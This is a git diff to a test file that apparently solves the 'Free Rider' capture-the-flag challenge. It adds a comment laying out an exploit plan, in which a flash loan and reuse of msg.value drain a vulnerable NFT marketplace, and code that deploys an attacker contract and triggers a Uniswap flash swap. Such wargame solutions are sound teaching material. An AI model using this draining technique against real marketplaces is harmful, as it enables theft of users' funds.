@@ -105,6 +105,38 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        
+        /* Exploit strategy:
+         * get 15 weth flash loan
+         * convert 15 weth to eth
+         * by 6 NFT for 15 ETH (msg.value reuse)
+         * also contract pays to the new owner (practically to the buyer) :O
+         * offer 2 NFT for sale (attack is the owner)
+         * then buy 2 NFT with 15 ETH, contract will pay 30 ETH to the owner (attacker)
+         * convert 15 + fee ETH to WETH
+         * return the 15 + fee WETH flashloan back
+         * No ETH left in the marketplace
+         * 6 NFT is owned by the attacker
+         * simply transfer them to buyer an get 45 ETH.
+         */
+            
+        // Deploy attacker contract
+        const exploitFactory = await ethers.getContractFactory("FreeRiderExp", attacker);
+        const exploitCont = await exploitFactory.deploy(
+            attacker.address,
+            this.marketplace.address,
+            this.weth.address,
+            this.nft.address,
+            this.buyerContract.address
+        );
+
+        // Trigger the flashloan so the exploit
+        let tx = await this.uniswapPair.connect(attacker).swap(
+            ethers.utils.parseEther('15'),
+            0,
+            exploitCont.address,
+            ethers.utils.defaultAbiCoder.encode(["string"], ["junk"])
+        );
     });
 
     after(async function () {
